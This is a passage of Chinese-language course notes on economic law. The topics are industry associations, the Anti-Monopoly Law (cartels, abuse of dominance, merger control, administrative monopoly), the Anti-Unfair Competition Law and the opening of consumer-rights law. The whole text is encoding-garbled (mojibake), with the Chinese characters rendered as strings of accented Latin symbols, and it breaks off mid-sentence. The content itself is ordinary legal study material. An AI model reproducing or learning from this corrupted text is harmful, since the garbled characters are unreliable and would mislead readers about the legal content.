äº’ç›Šæ€§ï¼šç›¸å¯¹å…¬ç›Šæ€§è€Œè¨€çš„æ¦‚å¿µã€‚äº’ç›Šæ€§ç»„ç»‡æ˜¯ç”±æœ‰ç€å…±åŒèº«ä»½åœ°ä½ã€åˆ©ç›Šéœ€æ±‚ä»¥åŠçˆ±å¥½å¿—è¶£çš„ç¾¤ä½“ç»„æˆçš„å›¢ä½“ï¼Œå…·æœ‰å°é—­æ€§ï¼Œä»¥å…¶æˆå‘˜åˆ©ç›Šä¸ºè¿½æ±‚ç›®æ ‡ã€‚    ç¬¬2èŠ‚ è¡Œä¸šåä¼šçš„è‡ªæ²»æƒ #   è¡Œä¸šåä¼šè‡ªæ²»æƒï¼šè¡Œä¸šåä¼šæ‰€äº«æœ‰çš„å°±æœ¬è¡Œä¸šå…±åŒäº‹åŠ¡è‡ªè¡Œæ²»ç†å’Œè‡ªè¡Œç®¡ç†çš„ å¯¹æœ¬è¡Œä¸šåä¼šæˆå‘˜å…·æœ‰çº¦æŸåŠ›å’Œæ”¯é…åŠ› çš„ä¸€ç§æƒåˆ©ã€‚ è‡ªæ²»æƒçš„æ¥æºï¼š(1)æ¥æºäºæ³•å¾‹æˆæƒ; (2)æ¥æºäºæ”¿åºœå§”æ‰˜; (3)æ¥è‡ªäºä¼šå‘˜çš„è®©æ¸¡ã€‚ è‡ªæ²»æƒçš„ä¸»è¦å†…å®¹  ä»£è¡¨èŒèƒ½ã€‚è¡Œä¸šåä¼šæ˜¯è¡Œä¸šåˆ©ç›Šã€ä¼šå‘˜å…±åŒåˆ©ç›Šçš„ä»£è¡¨ã€‚ æœåŠ¡èŒèƒ½ã€‚è¡Œä¸šåä¼šçš„å®—æ—¨æ˜¯ç»´æŠ¤è¡Œä¸šåˆ©ç›Šï¼Œç»´æŠ¤è¡Œä¸šå†…ä¼ä¸šåˆ©ç›Šï¼Œä¸ºè¡Œä¸šæœåŠ¡ï¼Œä¸ºè¡Œä¸šå†…ä¼ä¸šæœåŠ¡ã€‚ä¸»è¦ä½“ç°åœ¨ä¿¡æ¯ã€å’¨è¯¢ã€èŒä¸šæ•™è‚²ä¸‰ä¸ªæ–¹é¢ã€‚ åè°ƒèŒèƒ½ã€‚æ˜¯ä¸­ä»‹æ€§çš„ä½“ç°ï¼Œä¸»è¦ä½“ç°åœ¨è¡Œä¸šåä¼šåœ¨æ”¿åºœä¸ä¼ä¸šé—´çš„æ¡¥æ¢ä½œç”¨ å¸‚åœºç®¡ç†èŒèƒ½ï¼š(1)è¡Œè§„è¡Œçº¦ä¸æ ‡å‡†åˆ¶å®šæƒ; (2)è®¤è¯æƒ; (3)è®¸å¯æƒ; (4)å¯¹ä¼šå‘˜çš„æƒ©æˆ’æƒã€‚   è¡Œä¸šè‡ªå¾‹ã€æ”¿åºœç›‘ç®¡ä¸å¸‚åœºçš„å…³ç³»  å¸•ç´¯æ‰˜æœ€ä¼˜çŠ¶æ€(Pareto efficiency)ï¼šæ²¡æœ‰ä»»ä½•äººçš„æ•ˆç”¨å—æŸï¼Œèµ„æºåˆ†é…è·å¾—æœ€ä½³æ•ˆç‡ã€‚ å¸‚åœºå¤±çµä½¿æ”¿åºœç§¯æå¹²é¢„æˆä¸ºå…±è¯†ã€‚    ç¬¬3èŠ‚ è¡Œä¸šåä¼šçš„ç›‘ç®¡ä½“åˆ¶ #   å¯¹è¡Œä¸šåä¼šè¿›è¡Œç›‘ç®¡çš„å¿…è¦æ€§ï¼šä¸€åˆ‡æƒåŠ›éƒ½å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½æ€§ã€‚ æˆ‘å›½ç›®å‰çš„è¡Œä¸šåä¼šç›‘ç®¡ç‰¹ç‚¹ï¼š  ä¸¥æ ¼å‡†å…¥ï¼šè®¾ç«‹æ¡ä»¶ä¸¥æ ¼å¹¶ä¸”é‡‡ç”¨å®¡æ‰¹åˆ¶ï¼› åŒé‡ç®¡ç†ï¼šå®è¡Œä¸šåŠ¡ä¸»ç®¡éƒ¨é—¨å’Œç™»è®°éƒ¨é—¨åŒé‡ç®¡ç† ä¸€ä¸šä¸€ä¼šï¼šå¿çº§ä»¥ä¸ŠåŒä¸€è¡Œæ”¿åŒºå†…ï¼Œä¸å¾—é‡å¤è®¾ç«‹ä¸šåŠ¡èŒƒå›´ç›¸åŒæˆ–ç›¸ä¼¼çš„è¡Œä¸šåä¼šã€‚    ç¬¬ä¸ƒç«  å…¬å¸æ³• #  ç¬¬å…«ç«  ä¼ä¸šæ³• #  ç¬¬ä¹ç«  ç ´äº§æ³• #  ç¬¬äºŒç¼–è¯¾å ‚ç¬”è®° #  DAY FIVE #   ç¤¾ä¼šä¸­é—´å±‚ï¼šæ˜¯æŒ‡ç‹¬ç«‹äºæ”¿åºœä¸»ä½“ä¸å¸‚åœºä¸»ä½“ã€‚ä¸ºæ”¿åºœå¹²é¢„å¸‚åœºã€å¸‚åœºå½±å“æ”¿åºœå’Œå¸‚åœºä¸»ä½“ä¹‹é—´ç›¸äº’è”ç³»èµ·ä¸­ä»‹ä½œç”¨çš„ä¸»ä½“ã€‚ ä¼ä¸šæ³•å¾‹åˆ¶åº¦ï¼š  ä¸ªäººç‹¬èµ„ä¼ä¸šï¼šäº¦ç§°ä½œä¸šä¸»åˆ¶ä¼ä¸š åˆä¼™ä¼ä¸šï¼šæŠŠå‡ ä¸ªä¸šä¸»å åŠ åœ¨ä¸€èµ·ã€‚ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šå‡ºèµ„äººä¸ºäº†å®ç°ä¸€å®šçš„ç»æµç›®çš„ï¼Œæ ¹æ®åˆä¼™åè®®ï¼Œå…±åŒå‡ºèµ„ã€åˆä¼™ç»è¥ã€å…±æ‹…é£é™©ã€å…±äº«æ”¶ç›Šï¼Œå¯¹åˆä¼™ä¼ä¸šæ‰¿æ‹…æ— é™è¿å¸¦è´£ä»»çš„ç»„ç»‡ã€‚ å…¬å¸ï¼šå‡ºèµ„äººä»¥å…¶è®¤ç¼´å‡ºèµ„é¢ä¸ºé™æ‰¿æ‹…æœ‰é™è´£ä»»ã€‚    ç¬¬åç«  åå„æ–­æ³•ï¼Œæ³•æ¡ #  ç¬¬2èŠ‚ æˆ‘å›½åå„æ–­æ³•çš„ç«‹æ³•æ€æƒ³ä¸è§„åˆ¶åŸåˆ™ #   ä»æˆ‘å›½ã€Šåå„æ–­æ³•ã€‹ç¬¬1æ¡çš„è¡¨è¿°å¯ä»¥çœ‹å‡ºï¼Œæˆ‘å›½åå„æ–­æ³•è¿½æ±‚çš„æ˜¯å¤šå…ƒåŒ–çš„ç«‹æ³•å®—æ—¨: ç«‹æ³•å®—æ—¨ï¼š(1)é¢„é˜²å’Œåˆ¶æ­¢å„æ–­è¡Œä¸ºï¼Œä¿æŠ¤ç«äº‰; (2)ç»´æŠ¤æ¶ˆè´¹è€…åˆæ³•æƒç›Š; (3)ç»´æŠ¤ç¤¾ä¼šå…¬å…±åˆ©ç›Šã€‚ å„æ–­è¡Œä¸ºçš„è®¤å®šåŸåˆ™ï¼š  åŸåˆ™è¿æ³•åŸåˆ™ï¼šåˆç§°å½“ç„¶è¿æ³•åŸåˆ™ã€‚å®ƒé€‚ç”¨äºä¸»è§‚ä¸Šå­˜åœ¨å±å®³å¸‚åœºç«äº‰ï¼Œå¹¶ä¸”å®é™…ä¸Šä¹Ÿå¾€å¾€èƒ½äº§ç”Ÿä¸¥é‡å±å®³å¸‚åœºç«äº‰ï¼ŒæŸå®³æ¶ˆè´¹è€…åˆ©ç›Šçš„è¿æ³•è¡Œä¸ºã€‚  é€‚ç”¨æ—¶åŸå‘Šåªéœ€è¯æ˜å­˜åœ¨è¿™æ ·çš„å„æ–­è¡Œä¸ºï¼Œè€Œä¸éœ€è¦è¯æ˜è¡Œä¸ºçš„åç«äº‰æ€§ã€‚   åˆç†åŸåˆ™ï¼šåˆç§°åˆç†åˆ†æåŸåˆ™ã€‚æ˜¯æŒ‡ç»è¥è€…è¡Œä¸ºæ˜¯å¦è¿åå„æ–­æ³•æ—¶ï¼Œéœ€è¦å¯¹å½±å“ç«äº‰çš„å„ç§å› ç´ è¿›è¡Œåˆ†æè¯„ä»·ï¼Œåªæœ‰é‚£äº›ä¸åˆç†åœ°é™åˆ¶äº†ç«äº‰çš„è¡Œä¸ºæ‰æ˜¯åå„æ–­æ³•æ‰€ç¦æ­¢çš„ã€‚  å¦‚æœåœ¨ç»æµä¸Šå¸¦æ¥çš„æœ‰åˆ©å› ç´ è¶…è¿‡é™åˆ¶ç«äº‰å¸¦æ¥çš„ä¸åˆ©å› ç´ ï¼Œæ‰§æ³•éƒ¨é—¨ä¼šè®¤å®šè¿™ä¸ªè¡Œä¸ºæ˜¯åˆæ³•çš„ã€‚     é€‚ç”¨é™¤å¤–åŸåˆ™ï¼šæŒ‡åœ¨æŸäº›ç‰¹å®šçš„è¡Œä¸šæˆ–é¢†åŸŸï¼ŒåŸºäºç«äº‰æ”¿ç­–ä»¥å¤–çš„å…¶ä»–æ”¿ç­–çš„è€ƒè™‘ç­‰åŸå› ï¼Œå…è®¸ä¸€å®šçš„å„æ–­çŠ¶æ€ä»¥åŠå„æ–­è¡Œä¸ºå­˜åœ¨çš„åŸåˆ™ã€‚  é€‚ç”¨çš„èŒƒå›´åŒ…æ‹¬ï¼š(1)ç‰¹å®šçš„è¡Œä¸š; (2)æ­£å½“è¡Œä½¿çŸ¥è¯†äº§æƒ; (3)å¯¹ç‰¹å®šç»„ç»‡æˆ–äººå‘˜; (4)å¯¹å¤–ç»è´¸é¢†åŸŸã€‚    ç¬¬3èŠ‚ æˆ‘å›½åå„æ–­æ³•è§„åˆ¶çš„ä¸»è¦å†…å®¹ #   å„æ–­åè®®ï¼šæ’é™¤é™åˆ¶ç«äº‰çš„åè®®ã€å†³å®šæˆ–è€…å…¶ä»–ååŒè¡Œä¸ºã€‚  æ„æˆå½¢å¼ï¼šåè®®ã€å†³å®šæˆ–ååŒè¡Œä¸ºã€‚ ä»¥è¾¾æˆå„æ–­åè®®çš„ä¸»ä½“ä¹‹é—´çš„å…³ç³»åˆ’åˆ†ï¼š  æ¨ªå‘åè®®ï¼šä¹Ÿç§°å¡å°”ç‰¹ã€æ°´å¹³åè®®ã€‚å¤„äºåŒä¸€äº¤æ˜“é˜¶æ®µçš„ç»è¥è€…å³ç«äº‰å¯¹æ‰‹ä¹‹é—´è¾¾æˆçš„å„æ–­åè®®ã€‚ çºµå‘åè®®ï¼šä¹Ÿç§°å‚ç›´åè®®ï¼Œå¤„äºä¸åŒäº¤æ˜“é˜¶æ®µçš„ç»è¥è€…å³äº¤æ˜“å¯¹æ‰‹ä¹‹é—´è¾¾æˆçš„å„æ–­åè®®ã€‚ æˆ‘å›½åå„æ–­æ³•åªå¯¹å…¶ä¸­ä¸€éƒ¨åˆ†åšå‡ºäº†æ˜ç¡®çš„ç¦æ­¢æ€§è§„å®šã€‚   æ¨ªå‘å„æ–­åè®®ï¼š  å›ºå®šæˆ–å˜æ›´å•†å“ä»·æ ¼ï¼šå„æ–­åè®®ä¸­å¯¹å¸‚åœºå±å®³æœ€ä¸¥é‡çš„ä¸€ç§å½¢å¼ï¼Œä¹Ÿç§°ä»·æ ¼å¡ç‰¹å°”ã€‚ é™åˆ¶å•†å“çš„ç”Ÿäº§æ•°é‡æˆ–è€…ä»·æ ¼é”€å”®æ•°é‡ï¼šä¹Ÿç§°æ•°é‡å¡å°”ç‰¹ã€‚ åˆ†å‰²é”€å”®å¸‚åœºæˆ–è€…åŸææ–™é‡‡è´­å¸‚åœºï¼šä¹Ÿç§°åœ°åŸŸå¡å°”ç‰¹ã€‚ é™åˆ¶è´­ä¹°æ–°æŠ€æœ¯ã€æ–°è®¾å¤‡æˆ–è€…é™åˆ¶å¼€å‘æ–°æŠ€æœ¯ã€æ–°äº§å“ è”åˆæŠµåˆ¶ï¼šä¹Ÿç§°é›†ä½“æ‹’ç»äº¤æ˜“ã€è”åˆæ‹’ç»äº¤æ˜“ã€‚ å›½åŠ¡é™¢åå„æ–­æ‰§æ³•æœºæ„è®¤å®šçš„å…¶ä»–å„æ–­åè®®ã€‚   çºµå‘å„æ–­åè®®ï¼š  å›ºå®šå‘ç¬¬ä¸‰äººè½¬å”®å•†å“çš„ä»·æ ¼ é™å®šå‘ç¬¬ä¸‰äººè½¬å”®å•†å“çš„æœ€ä½ä»·æ ¼ å›½åŠ¡é™¢åå„æ–­æ‰§æ³•æœºæ„è®¤å®šçš„å…¶ä»–å„æ–­åè®®   è®¤å®šå…¶ä»–ååŒè¡Œä¸ºï¼Œåº”å½“è€ƒè™‘ä¸‹åˆ—å› ç´ ï¼ˆæ ¹æ®ã€Šå·¥å•†è¡Œæ”¿ç®¡ç†æœºå…³ç¦æ­¢å„æ–­åè®®è¡Œä¸ºçš„è§„å®šã€‹ç¬¬3æ¡ï¼‰ï¼š(1)ç»è¥è€…çš„å¸‚åœºè¡Œä¸ºæ˜¯å¦ä¸€è‡´; (2)ç»è¥è€…ä¹‹é—´æ˜¯å¦è¿›è¡Œè¿‡æ„æ€è”ç»œæˆ–è€…ä¿¡æ¯äº¤æµ; (3)ç»è¥è€…èƒ½å¦å¯¹ä¸€è‡´è¡Œä¸ºåšå‡ºåˆç†è§£é‡Šã€‚è¿˜åº”å½“è€ƒè™‘ç›¸å…³å¸‚åœºçš„ç»“æ„æƒ…å†µã€ç«äº‰çŠ¶å†µã€å¸‚åœºå˜åŒ–æƒ…å†µã€è¡Œä¸šæƒ…å†µç­‰ã€‚   å¸‚åœºæ”¯é…åœ°ä½ï¼šç»è¥è€…åœ¨ç›¸å…³å¸‚åœºå†…å…·æœ‰èƒ½å¤Ÿæ§åˆ¶å•†å“ä»·æ ¼ã€æ•°é‡æˆ–è€…å…¶ä»–äº¤æ˜“æ¡ä»¶ï¼Œæˆ–è€…èƒ½å¤Ÿé˜»ç¢ã€å½±å“å…¶ä»–ç»è¥è€…è¿›å…¥ç›¸å…³å¸‚åœºèƒ½åŠ›çš„å¸‚åœºåœ°ä½ã€‚  å¸‚åœºæ”¯é…åœ°ä½çš„è®¤å®šä¸æ¨å®šï¼šï¼ˆæ ¹æ®ã€Šåå„æ–­æ³•ã€‹ç¬¬18æ¡çš„è§„å®šï¼‰(1)ä¼ä¸šçš„å¸‚åœºä»½é¢; (2)ç›¸å…³å¸‚åœºå†…çš„ç«äº‰çŠ¶å†µ; (3)ç»è¥è€…å¯¹å¸‚åœºçš„æ§åˆ¶èƒ½åŠ›; (4)ç»è¥è€…çš„è´¢åŠ›å’ŒæŠ€æœ¯æ¡ä»¶; (5)å…¶ä»–ç»è¥è€…å¯¹è¯¥ç»è¥è€…åœ¨äº¤æ˜“ä¸Šçš„ä¾èµ–ç¨‹åº¦; (6)å…¶ä»–ç»è¥è€…è¿›å…¥è¯¥ç›¸å…³å¸‚åœºçš„éš¾æ˜“ç¨‹åº¦ã€‚ æ»¥ç”¨å¸‚åœºæ”¯é…åœ°ä½çš„è¡Œä¸ºï¼ˆæˆ‘å›½ã€Šåå„æ–­æ³•ã€‹ä¸­åˆ—ä¸¾çš„å…­ç§æ»¥ç”¨å¸‚åœºæ”¯é…åœ°ä½çš„è¡Œä¸ºï¼‰  ä»¥å„æ–­é«˜ä»·é”€å”®æˆ–ä»¥å„æ–­ä½ä»·è´­è¿› æ å¤ºæ€§å®šä»·ï¼šæŒç»­ä»¥ä½äºæˆæœ¬çš„ä»·æ ¼é”€å”®å•†å“ï¼Œä»¥ä¾¿å°†å¯¹æ‰‹æ’æŒ¤å‡ºå¸‚åœºï¼Œæˆ–é˜»æ­¢æ–°çš„ç«äº‰è€…è¿›å…¥å¸‚åœºã€‚ æ‹’ç»äº¤æ˜“ï¼šæ²¡æœ‰æ­£å½“ç†ç”±è€Œæ‹’ç»ä¸äº¤æ˜“ç›¸å¯¹äººè¿›è¡Œäº¤æ˜“çš„è¡Œä¸ºã€‚ å¼ºåˆ¶äº¤æ˜“ï¼šæ²¡æœ‰æ­£å½“ç†ç”±ï¼Œé™åˆ¶äº¤æ˜“ç›¸å¯¹äººåªèƒ½ä¸å…¶è¿›è¡Œäº¤æ˜“æˆ–è€…åªèƒ½ä¸å…¶æŒ‡å®šçš„ç»è¥è€…è¿›è¡Œäº¤æ˜“ã€‚ æ­å”®ï¼šå¼ºè¿«äº¤æ˜“å¯¹æ–¹è´­ä¹°ä»æ€§è´¨ã€äº¤æ˜“ä¹ æƒ¯ä¸Šå‡ä¸åˆåŒæ— å…³çš„äº§å“æˆ–æœåŠ¡ï¼Œæˆ–è€…ç¬¦åŠ å…¶ä»–ä¸åˆç†çš„æ¡ä»¶ã€‚ å·®åˆ«å¾…é‡ï¼šä¹Ÿç§°æ­§è§†è¡Œä¸ºï¼Œæ²¡æœ‰æ­£å½“ç†ç”±å¯¹æ¡ä»¶ç›¸åŒçš„äº¤æ˜“ç›¸å¯¹äººé‡‡å–ä¸åŒçš„äº¤æ˜“ä»·æ ¼ç­‰äº¤æ˜“æ¡ä»¶ï¼Œè€Œä½¿æœ‰çš„äº¤æ˜“å¯¹æ–¹å¤„äºä¸åˆ©çš„ç«äº‰åœ°ä½ã€‚ å…¶ä»–æ»¥ç”¨å¸‚åœºæ”¯é…åœ°ä½çš„è¡Œä¸ºã€‚     ç»è¥è€…é›†ä¸­ï¼š  ç»è¥è€…é›†ä¸­çš„å½¢å¼ï¼š(1)åˆå¹¶; (2)é€šè¿‡å–å¾—è‚¡æƒæˆ–è€…èµ„äº§å–å¾—å¯¹å…¶ä»–ç»è¥è€…çš„æ§åˆ¶æƒ; (3)é€šè¿‡åˆåŒç­‰æ–¹å¼å–å¾—å¯¹å…¶ä»–ç»è¥è€…çš„æ§åˆ¶æƒæˆ–è€…å¯¹å…¶ä»–ç»è¥è€…æ–½åŠ å†³å®šæ€§å½±å“ã€‚ ç»è¥è€…é›†ä¸­çš„ç”³æŠ¥ï¼šæˆ‘å›½é‡‡å–äº‹å…ˆç”³æŠ¥çš„å¼ºåˆ¶æ€§åˆ¶åº¦ã€‚ ç»è¥è€…é›†ä¸­çš„å®¡æŸ¥ï¼šä¸»è¦ä»å¸‚åœºä»½é¢ã€å¸‚åœºé›†ä¸­åº¦ã€å¸‚åœºè¿›å‡ºå£å’ã€å¯¹æ¶ˆè´¹è€…çš„å½±å“ç­‰æ–¹é¢åˆ†æã€‚   è¡Œæ”¿å„æ–­ï¼šæˆ‘å›½ã€Šåå„æ–­æ³•ã€‹é™¤äº†ä¼ ç»Ÿä¸‰å¤§ç»æµå„æ–­è¡Œä¸ºä¹‹å¤–ï¼Œè¿˜è§„å®šäº†è¡Œæ”¿æœºå…³çš„è¡Œæ”¿å„æ–­è¡Œä¸º  è¡Œæ”¿å¼ºåˆ¶äº¤æ˜“è¡Œä¸ºï¼šè¡Œæ”¿æœºå…³å’Œæ³•å¾‹ã€æ³•è§„æˆæƒçš„å…·æœ‰ç®¡ç†å…¬å…±äº‹åŠ¡èŒèƒ½çš„ç»„ç»‡æ»¥ç”¨è¡Œæ”¿æƒåŠ›ï¼Œé™å®šæˆ–è€…å˜ç›¸é™å®šå•ä½æˆ–ä¸ªäººç»è¥ã€è´­ä¹°ã€ä½¿ç”¨å…¶æŒ‡å®šçš„ç»è¥è€…æä¾›çš„å•†å“ã€‚ åœ°åŒºå°é”è¡Œä¸ºï¼šè¡Œæ”¿æœºå…³å’Œæ³•å¾‹ã€æ³•è§„æˆæƒçš„å…·æœ‰ç®¡ç†å…¬å…±äº‹åŠ¡èŒèƒ½çš„ç»„ç»‡æ»¥ç”¨è¡Œæ”¿æƒåŠ›ï¼Œé˜»æŒ ã€é™åˆ¶å¤–åœ°ä¸æœ¬åœ°çš„äº§å“ã€æœåŠ¡ã€èµ„é‡‘ç­‰çš„è‡ªç”±æµé€šè¡Œä¸ºï¼ˆåœ°æ–¹ä¿æŠ¤ä¸»ä¹‰ï¼‰ã€‚ å¼ºåˆ¶ä»äº‹å„æ–­è¡Œä¸ºï¼šå¼ºåˆ¶ç»è¥è€…ä»äº‹åå„æ–­æ³•è§„å®šçš„å„æ–­è¡Œä¸ºã€‚ æŠ½è±¡è¡Œæ”¿å„æ–­è¡Œä¸ºã€‚    ç¬¬åä¸€ç«  åä¸æ­£å½“ç«äº‰æ³•ï¼Œæ³•æ¡ #  ç¬¬1èŠ‚ æ¦‚è¿° #   ä¸æ­£å½“ç«äº‰ï¼šæŒ‡åœ¨å·¥å•†é¡µæ´»åŠ¨ä¸­è¿åè¯šå®ã€å…¬å¹³ã€å¹³ç­‰çš„å•†ä¸šæƒ¯ä¾‹å’Œå…¬è®¤çš„å•†ä¸šé“å¾·ï¼Œé‡‡å–ä¸æ­£å½“çš„æ‰‹æ®µè·å¾—äº¤æ˜“æœºä¼šçš„è¡Œä¸ºã€‚  æˆ‘å›½ã€Šåä¸æ­£å½“ç«äº‰æ³•ã€‹ç¬¬2æ¡ç¬¬äºŒæ¬¾ï¼šæœ¬æ³•æ‰€ç§°çš„ä¸æ­£å½“ç«äº‰ï¼Œæ˜¯æŒ‡ç»è¥è€…è¿åæœ¬æ³•è§„å®šï¼ŒæŸå®³å…¶ä»–ç»è¥è€…åˆæ³•æƒç›Šï¼Œæ‰°ä¹±ç¤¾ä¼šç§©åºçš„è¡Œä¸º å› è€Œï¼Œä¸æ­£å½“ç«äº‰è¡Œä¸ºåº”è¯¥å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š  è¡Œä¸ºçš„è¿æ³•æ€§ è¡Œä¸ºçš„ä¸»ä½“æ˜¯ç»è¥è€…ï¼šä»äº‹å•†å“ç»è¥æˆ–è€…è¥åˆ©æ€§æœåŠ¡çš„æ³•äººã€å…¶ä»–ç»æµç»„ç»‡å’Œä¸ªäººã€‚ è¡Œä¸ºçš„å±å®³æ€§ï¼šè¡Œä¸ºæŸå®³å…¶ä»–ç»è¥è€…åˆæ³•æƒç›Šï¼Œæ‰°ä¹±ç¤¾ä¼šç»æµç§©åºã€‚      ç¬¬2èŠ‚ ä¸æ­£å½“ç«äº‰è¡Œä¸º #   å‡å†’è¡Œä¸ºï¼š  å‡å†’ä»–äººæ³¨å†Œå•†æ ‡ï¼šæœªç»æ³¨å†Œå•†æ ‡æ‰€æœ‰äººè®¸å¯ï¼Œåœ¨åŒä¸€ç§å•†å“æˆ–ç±»ä¼¼å•†å“ä¸Šä½¿ç”¨ä¸å…¶æ³¨å†Œå•†æ ‡ç›¸åŒæˆ–è€…è¿‘ä¼¼çš„å•†æ ‡çš„è¡Œä¸ºã€‚ å‡å†’ã€ä»¿å†’çŸ¥åå•†å“ç‰¹æœ‰çš„åç§°ã€åŒ…è£…å’Œè£…æ½¢ æ“…è‡ªä½¿ç”¨ä»–äººä¼ä¸šåç§°æˆ–å§“å ä¼ªé€ ã€å†’ç”¨è´¨é‡æ ‡å¿—ã€ä¼ªé€ äº§åœ°ç­‰è™šå‡è¡¨ç¤º   å•†ä¸šè´¿èµ‚ï¼šæŒ‡ç»è¥è€…ä¸ºé”€å”®æˆ–è€…è´­ä¹°å•†å“è€Œé‡‡ç”¨è´¢åŠ¡æˆ–è€…å…¶ä»–æ‰‹æ®µè´¿èµ‚å¯¹æ–¹å•ä½æˆ–è€…ä¸ªäººçš„è¡Œä¸ºã€‚  å‡ ä¸ªæ¦‚å¿µï¼šâ€œå›æ‰£â€ï¼Œâ€œæŠ˜æ‰£â€ï¼Œâ€œä½£é‡‘â€ï¼Œâ€œå¸å¤–æš—ä¸­â€ï¼Œâ€œæ˜ç¤ºå…¥è´¦â€   è™šå‡å®£ä¼ ï¼šç»è¥è€…åˆ©ç”¨å¹¿å‘Šæˆ–å…¶ä»–æ–¹æ³•å¯¹å•†å“æˆ–æœåŠ¡åšå‡ºä¸å®é™…æƒ…å†µä¸ç¬¦çš„å…¬å¼€å®£ä¼ ï¼Œå¯¼è‡´æˆ–è¶³ä»¥å¯¼è‡´ä»–äººäº§ç”Ÿé”™è¯¯è®¤è¯†çš„ä¸æ­£å½“ç«äº‰è¡Œä¸ºã€‚ ä¾µçŠ¯å•†ä¸šç§˜å¯†ï¼šæˆ‘å›½ã€Šåä¸æ­£å½“ç«äº‰æ³•ã€‹ä¸­è§„å®šçš„å•†ä¸šç§˜å¯†æ˜¯æŒ‡ï¼šä¸ä¸ºå…¬ä¼—æ‰€çŸ¥æ‚‰ï¼Œèƒ½ä¸ºæƒåˆ©äººå¸¦æ¥ç»æµåˆ©ç›Šï¼Œå…·æœ‰å®ç”¨æ€§å¹¶ç»æƒåˆ©äººé‡‡å–ä¿å¯†æªæ–½çš„æŠ€æœ¯ä¿¡æ¯å’Œç»è¥ä¿¡æ¯ã€‚ ä¸æ­£å½“æœ‰å¥–é”€å”®ï¼š  æœ‰å¥–é”€å”®æ˜¯æŒ‡ç»è¥è€…ä»¥é™„å¸¦æ€§åœ°æä¾›ç‰©å“ã€é‡‘é’±æˆ–å…¶ä»–ç»æµåˆ©ç›Šçš„å¼•è¯±æ–¹å¼ï¼Œé”€å”®å…¶å•†å“æˆ–æœåŠ¡çš„è¡Œä¸ºã€‚ä¸æ­£å½“æœ‰å¥–é”€å”®åŒ…æ‹¬:   æ¬ºéª—å¼æœ‰å¥–é”€å”®ï¼šè°ç§°æœ‰å¥–ã€æ•…æ„è®©å†…å®šäººå‘˜ä¸­å¥–ã€æ“æ§æœ‰å¥–é”€å”®ã€å¯¹æœ‰å¥–é”€å”®äº‹é¡¹åšä¸å½“å‘ŠçŸ¥ã€‚ åˆ©ç”¨æœ‰å¥–é”€å”®æ¨é”€è´¨æ¬¡ä»·é«˜çš„å•†å“ å·¨é¢æœ‰å¥–é”€å”®ï¼ˆæŠ½å¥–å¼æœ‰å¥–é”€å”®æœ€é«˜å¥–ä¸å¾—è¶…è¿‡5000å…ƒï¼‰   å•†ä¸šè¯‹æ¯ï¼šæŒ‡ç»è¥è€…è‡ªå·±æˆ–è€…åˆ©ç”¨ä»–äººï¼Œé€šè¿‡æé€ ã€æ•£å¸ƒè™šä¼ªäº‹å®ç­‰ä¸æ­£å½“æ‰‹æ®µï¼Œè´¬ä½ã€è¯‹æ¯ç«äº‰å¯¹æ‰‹çš„å•†ä¸šä¿¡èª‰ã€å•†å“å£°èª‰ï¼Œä»¥å‰Šå¼±å…¶å¸‚åœºç«äº‰åŠ›çš„è¡Œä¸ºã€‚  ç¬¬3èŠ‚ ä¸æ­£å½“ç«äº‰è¡Œä¸ºçš„ç›‘ç£æ£€æŸ¥å’Œæ³•å¾‹è´£ä»» #   ç›‘ç£æ£€æŸ¥ï¼šã€Šåä¸æ­£å½“ç«äº‰æ³•ã€‹ç¬¬3æ¡ç¬¬äºŒæ¬¾è§„å®šï¼šå¿çº§ä»¥ä¸Šäººæ°‘æ”¿åºœå·¥å•†è¡Œæ”¿ç®¡ç†éƒ¨é—¨å¯¹ä¸æ­£å½“ç«äº‰è¡Œä¸ºè¿›è¡Œç›‘ç£æ£€æŸ¥ï¼›æ³•å¾‹è¡Œæ”¿æ³•è§„è§„å®šç”±å…¶ä»–éƒ¨é—¨ç›‘ç£æ£€æŸ¥çš„ï¼Œä¾ç…§å…¶è§„å®šã€‚  æ£€æŸ¥éƒ¨é—¨æœ‰ä»¥ä¸‹èŒæƒï¼š(1)è¯¢é—®å–è¯æƒ; (2)æ£€æŸ¥è´¢åŠ¡ç­‰æƒåŠ›ã€‚   æ³•å¾‹è´£ä»»ï¼šæ°‘äº‹è´£ä»»ã€è¡Œæ”¿è´£ä»»ã€åˆ‘äº‹è´£ä»»ã€‚  ç¬¬åäºŒç«  æ¶ˆè´¹è€…æƒç›Šä¿æŠ¤æ³•ï¼Œæ³•æ¡ #  ç¬¬1èŠ‚ æ¦‚è¿° #   ä»å¸‚åœºç»æµçš„ç†è®ºä¸Šè®²ï¼šä¼ä¸šçš„ç›®æ ‡æ˜¯å®ç°åˆ©æ¶¦çš„æœ€å¤§åŒ–ï¼Œè€Œæ¶ˆè´¹è€…çš„ç›®æ ‡æ˜¯å®ç°æ•ˆç”¨çš„æœ€å¤§åŒ–ã€‚ ã€Šæ¶ˆè´¹è€…æƒç›Šä¿æŠ¤æ³•ã€‹æ²¡æœ‰å¯¹é€‚ç”¨èŒƒå›´åšä¸“é¡¹è§„å®šï¼Œè€Œæ˜¯å°†å…¶ä¸æ¶ˆè´¹æ´»åŠ¨çš„æ¦‚å¿µåˆäºŒä¸ºä¸€äº†ï¼š  æ¶ˆè´¹èŒƒå›´é™äºç”Ÿæ´»æ¶ˆè´¹ã€‚  ç”Ÿæ´»æ¶ˆè´¹ï¼šäººä»¬ä¸ºäº†æ»¡è¶³ç‰©è´¨å’Œæ–‡åŒ–ç”Ÿæ´»çš„éœ€è¦è€Œæ¶ˆè´¹ç‰©è´¨äº§å“æˆ–è€…æ¥å—åŠ³åŠ¨æœåŠ¡çš„è¡Œä¸ºå’Œè¿‡ç¨‹ã€‚   æ¶ˆè´¹ä¸»ä½“é™äºè‡ªç„¶äººã€‚ æ¶ˆè´¹æ–¹å¼åŒ…æ‹¬è´­ä¹°å•†å“ã€ä½¿ç”¨å•†å“å’Œæ¥å—æœåŠ¡ã€‚    ç¬¬2èŠ‚ æ¶ˆè´¹è€…æƒåˆ© #   æ¶ˆè´¹è€…æƒç›Šæ˜¯æŒ‡æ¶ˆè´¹è€…ä¾æ³•äº«æœ‰çš„æƒåˆ©ä»¥åŠè¯¥æƒåˆ©å—åˆ°ä¿æŠ¤æ—¶ç»™æ¶ˆè´¹è€…å¸¦æ¥çš„åˆæ³•åˆ©ç›Šã€‚ä¸»è¦æœ‰ä»¥ä¸‹ä¹é¡¹æƒåˆ©ï¼š  